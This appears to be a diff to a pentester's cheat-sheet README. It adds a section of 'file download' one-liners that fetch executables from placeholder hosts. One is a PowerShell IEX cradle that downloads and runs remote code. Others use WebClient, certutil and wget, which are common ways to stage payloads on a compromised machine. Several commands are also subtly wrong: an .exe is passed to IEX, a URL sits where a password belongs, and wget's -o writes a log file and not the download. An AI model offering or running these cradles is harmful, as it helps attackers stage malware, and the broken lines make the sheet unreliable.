@@ -3,6 +3,13 @@ A collection of scripts / payloads and so on which I have found to be helpful du
 
 ## One-Liners
 
+### File download
+`powershell (New-Object System.Net.WebClient).DownloadFile('https://domain.com/file.exe', 'file.exe')`
+`powershell IEX (New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/file.exe')`
+`certutil.exe -urlcache -f https://domain.com/file.exe file.exe`
+`wget https://domain.com/file.exe -o file.exe`
+`wget --ftp-user=User --ftp-password=ftp://127.0.0.1/file.exe -o file.exe`
+
 ### Bash
 | Command | Description |
 |-----------------------------------------|----------------------------------------------------------|
